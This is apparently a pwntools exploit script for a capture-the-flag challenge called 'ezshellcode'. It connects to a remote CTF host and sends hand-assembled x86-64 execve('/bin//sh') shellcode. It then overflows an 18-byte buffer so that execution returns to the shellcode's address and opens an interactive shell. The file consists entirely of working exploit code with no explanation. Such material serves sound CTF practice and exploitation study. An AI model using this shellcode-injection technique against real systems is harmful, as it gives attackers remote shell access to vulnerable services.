from pwn import *

context(os="linux", arch="amd64", log_level="debug")

p = remote("node4.anna.nssnode.cn", 22702)

elf=ELF("./temp/ezshellcode/pwn")
rop = ROP(elf)
OFFSET = 18

print(hex(elf.sym['name']))
print(hex(elf.sym['stdout']))
print(hex(elf.sym['name'] & ~0xfff))
print(hex(elf.sym['stdout'] & ~0xfff))

ret=rop.find_gadget(['ret']).address
shellcode = asm(shellcraft.sh())
print(len(shellcode))
shellcode = asm(shellcraft.amd64.linux.sh())
print(f"Shellcode 长度：{len(shellcode)}")
shellcode = asm("""
    xor esi, esi
    push rsi
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push 59
    pop rax
    cdq
    syscall
""")
print(f"Shellcode 长度：{len(shellcode)}")
assert len(shellcode) <= 0x25
p.sendlineafter(b'lease.', shellcode);
payload = flat(
    b'a'*OFFSET,
    
    elf.sym['name']
)

p.sendlineafter(b'start!', payload)
p.interactive()
